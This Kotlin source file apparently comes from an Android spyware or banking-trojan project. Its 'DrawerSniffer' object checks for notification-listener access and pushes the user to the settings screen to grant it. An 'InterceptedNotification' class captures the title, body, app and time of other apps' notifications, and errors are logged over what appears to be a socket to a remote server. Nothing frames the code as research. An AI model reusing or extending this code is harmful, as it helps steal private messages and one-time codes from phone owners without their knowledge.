package com.xxx.zzz.notifp

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import androidx.annotation.Keep
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt

object DrawerSniffer {

    fun hasPermission(ctx: Context): Boolean {
        val cn = ComponentName(ctx, NotificationReadServicesd::class.java)
        val flat = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(cn.flattenToString())
    }

    fun requestPermission(ctx: Context) {
        runCatching {
            SharedPreferencess.clickNotifPermition = true
            val intent = Intent().apply {
                action = Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            ctx.startActivity(intent)
        }.onFailure {
            IOSocketyt.sendLogs("", "DrawerSniffer requestPermission ${it.localizedMessage}", "error")
        }
    }
}

@Keep
data class InterceptedNotification(
    val title: CharSequence,
    val body: CharSequence,
    val footer: String,
    val app: String,
    val time: Long
)